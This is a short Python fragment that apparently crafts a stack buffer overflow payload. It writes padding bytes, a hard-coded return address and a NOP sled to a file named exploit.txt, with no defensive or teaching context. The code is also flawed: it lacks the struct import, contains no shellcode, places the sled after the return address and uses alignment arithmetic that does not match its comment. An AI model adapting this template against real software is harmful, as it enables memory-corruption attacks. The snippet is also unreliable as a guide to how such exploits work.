# Address where the shellcode will be placed
shellcode_address = 0xbfffffff  

# Craft the payload
payload = b"A" * 100  # Fill the buffer
payload += struct.pack("<I", shellcode_address)  # Overwrite the return address with the shellcode address
payload += b"\x90" * (33 - len(payload) % 33)  # NOP sled to ensure alignment

# Write the payload to a file
with open("exploit.txt", "wb") as f:
    f.write(payload)
